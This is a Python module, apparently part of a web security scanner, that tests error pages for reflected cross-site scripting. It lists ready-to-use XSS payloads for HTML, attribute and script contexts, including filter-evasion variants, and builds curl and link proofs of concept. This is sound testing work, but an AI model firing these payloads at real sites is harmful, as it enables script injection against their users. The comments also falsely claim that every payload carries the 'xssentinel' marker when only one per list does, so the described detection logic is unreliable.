"""Error-page (404 / 500) reflected XSS detection.

Many web applications reflect attacker-controlled input directly into
their error pages.  Because error pages are reached precisely when
something went wrong, the input that triggered the error is often
echoed back into the response body without sanitization -- the
developer assumed the value would never be rendered.  Common offenders:

  * ``404 Not Found: /path/<payload>``      -- path echoed into the page
  * ``500 Internal Server Error: <payload>`` -- exception message rendered
  * Debug pages with full stack traces       (Django debug, Flask debug,
                                              Spring Whitelabel error)
  * ``400 Bad Request: invalid value '<payload>'``
  * ``405 Method Not Allowed`` pages that echo the requested method
  * Generic catch-all templates that render ``request.path`` or
    ``request.query`` verbatim.

A typical vulnerable snippet (Express / Pug)::

    app.use((req, res) => {
      res.status(404).send(`<h1>Not Found: ${req.path}</h1>`);
    });

Hitting ``/<svg onload=alert(1)>`` yields::

    <h1>Not Found: <svg onload=alert(1)></h1>

Error pages have two exploitation quirks versus normal reflected XSS:

  1. **The reflection is conditional on a server-side fault.**  A
     payload that triggers a 200 OK on the same path will never reach
     the error template.  Testers must deliberately provoke the error
     (invalid path, malformed query, oversized input, etc.).

  2. **Debug / stack-trace pages are richer sinks.**  A 500 with a
     stack trace often renders the exception class, message, and
     failing input verbatim -- giving the attacker multiple sinks in
     a single response.

This module:

  1. Produces error-page payloads (path-safe variants and query
     variants).
  2. Detects whether a marker survived reflection.
  3. Classifies the surrounding context (HTML, attribute, script,
     JS string, comment, text).
  4. Identifies whether the response is an error page (status >= 400
     or contains canonical error indicators such as "Not Found",
     "Error", "Exception", "stack trace", "Warning").
  5. Builds curl and HTML PoC links.
"""
from __future__ import annotations
import re
import shlex


# Payloads tuned for error-page injection.  Two flavours are provided:
#
#   * Path-based -- appended to the URL path, provoking a 404 from
#     routers that fall through to a "Not Found" handler.  These
#     avoid embedded ``/`` so they do not split the path segment on
#     frameworks that fail to decode it.
#
#   * Query-based -- appended as a query parameter, useful for 400 /
#     500 responses that echo a malformed query value.
#
# Each payload contains the literal token ``xssentinel`` so reflection
# can be detected by string search even when the surrounding tag is
# mangled by an HTML-encoding filter.
_PATH_PAYLOADS: list[str] = [
    # Plain marker -- test whether ANY of the segment lands raw.
    "xssentinel",
    # HTML-context break-outs (no embedded slash)
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Attribute-context break-outs
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '" autofocus onfocus=alert(1) x="',
    # Script / JS-string context break-outs
    '";alert(1);//',
    "';alert(1);//",
    "</script><svg onload=alert(1)>",
    # Mixed-case variants for naive lowercase filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SVG/ONLOAD=alert(1)>",
    # Template-literal sink
    "`,alert(1),`",
]

# Query payloads may include characters that would split a path
# segment (``/``, ``?``, ``#``); they are intended to be sent as the
# value of a query parameter, where they survive unencoded.
_QUERY_PAYLOADS: list[str] = [
    "xssentinel",
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<iframe src=javascript:alert(1)>",
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '";alert(1);//',
    "';alert(1);//",
    "</script><svg onload=alert(1)>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "javascript:alert(1)//",
    "<body onload=alert(1)>",
]


# Context-classifier regexes (mirrors header_xss.py / path_xss.py).
# The first matching context wins.  We search for the marker surrounded
# by context clues rather than the payload itself, because filter
# mangling (e.g. ``<`` -> ``&lt;``) may leave the marker intact while
# breaking the tag.
_CONTEXT_HTML_TAG_RE = re.compile(
    r"<\w+[^>]*\b\w+\s*=\s*[^>]*xssentinel", re.IGNORECASE,
)
_CONTEXT_ATTR_VALUE_RE = re.compile(
    r"\b\w+\s*=\s*['\"][^'\"]*xssentinel", re.IGNORECASE,
)
_CONTEXT_SCRIPT_BLOCK_RE = re.compile(
    r"<script[^>]*>[^<]*xssentinel", re.IGNORECASE | re.DOTALL,
)
_CONTEXT_JS_STRING_RE = re.compile(
    r"['\"`][^'\"`]{0,200}xssentinel[^'\"`]{0,200}['\"`]", re.DOTALL,
)
_CONTEXT_HTML_COMMENT_RE = re.compile(
    r"<!--[^>]*xssentinel", re.DOTALL,
)
_CONTEXT_TEXT_RE = re.compile(r"xssentinel")


# Error-page indicator regexes.  A response is considered an error
# page if its HTTP status code is >= 400 OR any of these patterns
# match (case-insensitive).  Each entry: (compiled_regex, label).
_ERROR_INDICATOR_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\bNot Found\b", re.IGNORECASE), "not_found"),
    (re.compile(r"\b404\b"), "404"),
    (re.compile(r"\bInternal Server Error\b", re.IGNORECASE), "internal_server_error"),
    (re.compile(r"\b500\b"), "500"),
    (re.compile(r"\bBad Request\b", re.IGNORECASE), "bad_request"),
    (re.compile(r"\b400\b"), "400"),
    (re.compile(r"\bUnauthorized\b", re.IGNORECASE), "unauthorized"),
    (re.compile(r"\bForbidden\b", re.IGNORECASE), "forbidden"),
    (re.compile(r"\bMethod Not Allowed\b", re.IGNORECASE), "method_not_allowed"),
    (re.compile(r"\bService Unavailable\b", re.IGNORECASE), "service_unavailable"),
    (re.compile(r"\bGateway Timeout\b", re.IGNORECASE), "gateway_timeout"),
    (re.compile(r"\bStack(?:\s*Trace|trace)\b"), "stack_trace"),
    (re.compile(r"\bTraceback\b"), "traceback"),
    (re.compile(r"\bException\b", re.IGNORECASE), "exception"),
    (re.compile(r"\bError(?:\s+report|:\s*report)?\b", re.IGNORECASE), "error"),
    (re.compile(r"\bWarning\b", re.IGNORECASE), "warning"),
    (re.compile(r"\bFatal(?:\s+error)?\b", re.IGNORECASE), "fatal"),
    (re.compile(r"\bUndefined\b", re.IGNORECASE), "undefined"),
    (re.compile(r"\bUndefined index\b", re.IGNORECASE), "undefined_index"),
    (re.compile(r"\bSQLSTATE\b", re.IGNORECASE), "sqlstate"),
    (re.compile(r"\bPDOException\b", re.IGNORECASE), "pdo_exception"),
    (re.compile(r"\bNullPointerException\b"), "null_pointer_exception"),
    (re.compile(r"\bValueError\b"), "value_error"),
    (re.compile(r"\bTypeError\b"), "type_error"),
    (re.compile(r"\bWhitelabel Error\b", re.IGNORECASE), "whitelabel_error"),
    (re.compile(r"\bDebug\b.*\b(?:Trace|Backtrace)\b", re.IGNORECASE | re.DOTALL), "debug_trace"),
]


# Marker used by detect_reflection / analyze_response.  Callers SHOULD
# embed this token in their payload so the reflection check is
# reliable across filter transformations.
DEFAULT_MARKER = "xssentinel"


def error_payloads() -> list[str]:
    """Return payloads suitable for error-page injection testing.

    Combines path-safe payloads (no embedded ``/``) with query-safe
    payloads (which may contain ``/``).  Path-safe payloads are
    suitable for placement in a URL path segment that triggers a 404;
    query payloads are suitable for placement in a query parameter
    that triggers a 400 / 500.

    Each payload contains the literal token ``xssentinel`` so the
    reflection check is a plain substring search regardless of
    tag-level mangling.
    """
    # Preserve order, drop duplicates while keeping the path-safe
    # variants first (they are the most common error-page vector).
    seen: set[str] = set()
    out: list[str] = []
    for p in _PATH_PAYLOADS + _QUERY_PAYLOADS:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


def error_indicators() -> list[str]:
    """Return regex source strings that indicate an error page.

    Each entry is the source pattern (not compiled) so callers can
    embed them in their own regexes or compile with custom flags.
    A response is considered an error page if its status code is
    >= 400 OR any of these patterns match.
    """
    return [p.pattern for p, _ in _ERROR_INDICATOR_PATTERNS]


def _classify_context(response_text: str, marker: str) -> str:
    """Classify the reflection context of ``marker`` in ``response_text``.

    Returns one of: ``html_tag``, ``attribute``, ``script``,
    ``js_string``, ``comment``, ``text``, or ``none``.
    """
    if marker not in response_text:
        return "none"
    if _CONTEXT_HTML_TAG_RE.search(response_text):
        return "html_tag"
    if _CONTEXT_ATTR_VALUE_RE.search(response_text):
        return "attribute"
    if _CONTEXT_SCRIPT_BLOCK_RE.search(response_text):
        return "script"
    if _CONTEXT_HTML_COMMENT_RE.search(response_text):
        return "comment"
    if _CONTEXT_JS_STRING_RE.search(response_text):
        return "js_string"
    if _CONTEXT_TEXT_RE.search(response_text):
        return "text"
    return "text"


def _is_error_page(response_text: str | None, status_code: int | None) -> bool:
    """Return True if the response looks like an error page.

    A response is considered an error page when its status code is
    >= 400 OR the body contains one of the canonical error indicators
    (``Not Found``, ``Error``, ``Exception``, ``stack trace``,
    ``Warning``, etc.).
    """
    if status_code is not None and status_code >= 400:
        return True
    if not response_text:
        return False
    for pattern, _ in _ERROR_INDICATOR_PATTERNS:
        if pattern.search(response_text):
            return True
    return False


def detect_reflection(response_text: str | None, marker: str) -> bool:
    """Return True if ``marker`` appears verbatim in ``response_text``.

    Treats ``None`` / empty inputs as no reflection.  The check is a
    plain substring search (case-sensitive) so callers can use a
    distinctive marker such as ``xssentinel1234``.
    """
    if not response_text or not marker:
        return False
    return marker in response_text


def analyze_response(
    response_text: str | None,
    marker: str,
    status_code: int | None = None,
) -> dict:
    """Classify the reflection context of ``marker`` in an error page.

    Returns::

        {
            "reflected":     bool,   # marker present at all
            "context":       str,    # one of:
                                     #   "html_tag"   -- inside a tag
                                     #   "attribute"  -- inside an attr value
                                     #   "script"     -- inside <script>
                                     #   "js_string"  -- inside a JS string
                                     #   "comment"    -- inside an HTML comment
                                     #   "text"       -- raw HTML text
                                     #   "none"       -- not reflected
            "marker":        str,    # echo of the marker arg
            "is_error_page": bool,   # status >= 400 or contains error
                                     # indicators (Not Found, Error,
                                     # Exception, stack trace, Warning)
        }
    """
    if not response_text or not marker:
        return {
            "reflected": False,
            "context": "none",
            "marker": marker or "",
            "is_error_page": _is_error_page(response_text, status_code),
        }
    reflected = marker in response_text
    ctx = _classify_context(response_text, marker) if reflected else "none"
    return {
        "reflected": reflected,
        "context": ctx,
        "marker": marker,
        "is_error_page": _is_error_page(response_text, status_code),
    }


def build_poc_curl(url: str) -> str:
    """Build a curl command that fetches ``url`` (error payload embedded).

    The URL is shell-quoted so percent-encoded characters survive
    intact.  ``-i`` prints response headers so the auditor can verify
    the status code (typically 404 / 400 / 500).
    """
    if not url:
        return ""
    return f"curl -i {shlex.quote(url)}"


def build_poc_link(url: str) -> str:
    """Build an ``<a>`` link PoC that an auditor can click.

    The URL is HTML-attribute-escaped (``&`` -> ``&amp;`` etc.) so it
    is safe to embed in an ``href`` value.
    """
    if not url:
        return ""
    safe_url = (
        url.replace("&", "&amp;")
        .replace('"', "&quot;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )
    return (
        f'<a href="{safe_url}">click to trigger error-page XSS PoC</a>'
    )
